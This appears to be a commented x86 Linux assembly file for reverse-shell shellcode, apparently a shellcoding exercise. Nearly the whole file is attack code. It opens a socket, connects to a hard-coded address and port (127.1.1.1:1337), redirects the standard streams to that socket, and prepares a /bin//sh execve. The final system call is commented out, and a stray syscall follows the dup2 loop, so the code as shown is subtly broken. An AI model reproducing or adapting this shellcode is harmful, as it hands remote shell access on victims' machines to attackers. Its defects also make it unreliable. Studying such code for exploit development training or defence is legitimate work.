; reverse shell 
; Author: clubjk

global _start

section .text

_start:

	;Create a socket with sys_socket
	
	xor eax, eax    ;zeroize the eax
	xor ebx, ebx    ;zeroize the ebx
	
	mov al, 0x66    ;put socketcall syscall value in eax; 102 in decimal

	mov bl, 0x1     ;put sys_socket syscall value in ebx; 1 in decimal

	xor esi, esi    ;zeroize the esi, it will be convenient when we need a 0x0 value
	push esi        ;put 0x00000000 in stack, using esi since it is currently zeroized
	push ebx        ;put 0x00000001 in stack, using ebx since we set it to 0x1
	push 0x2        ;put 0x00000002 in stack, using immediate value of 0x2

	mov ecx, esp    ;pass memory location of esp (start of the stack) to ecx

	int 0x80        ;calling socket system call (102) with sockcall args


	;Connect to a specified IP and port (via sys_socket system call)

	mov edx, eax
	xor eax, eax
	mov al, 0x66
	xor ebx, ebx
	mov bl, 0x3
	
	push 0x0101017f
	push word 0x3905
	push word 0x2
	mov ecx, esp
	push 0x10
	push ecx
	push edx
	mov ecx, esp

	int 0x80

	
	;Redirect standard input (stdin), (stdout), (stderr) (via dup2 syscall)

	mov ebx, edx   ;move fd that returned from previous syscall (7) to ebx
	mov cl, 0x02   ;start counter at 2
	loop:
		mov al, 0x3f
		int 0x80
		dec ecx
		jns loop

  	int 0x80 

	;Execute a shell (via execve syscall)

	xor eax, eax   ;zeroize the eax
	push eax       ;push 0x0 on the stack
	push 0x68732f2f        ;push "hs//" on the stack
	push 0x6e69622f        ;push "nib/" on the stack
	mov ebx, esp           ;move the memory location of the start of stack (esp) to ebx
	push eax       ;push 0x0 on the stack
	mov edx, esp   ;move the memory location of the start of stack (esp) to edx
	push ebx       ;push ebx on the stack
	mov ecx, esp   ;move the memory location of the start of stack (esp) to ecx
	mov al, 0xb    ;move the execve functional call number (11) to eax
        
	;int 0x80       ;invokes the execve system call




				 
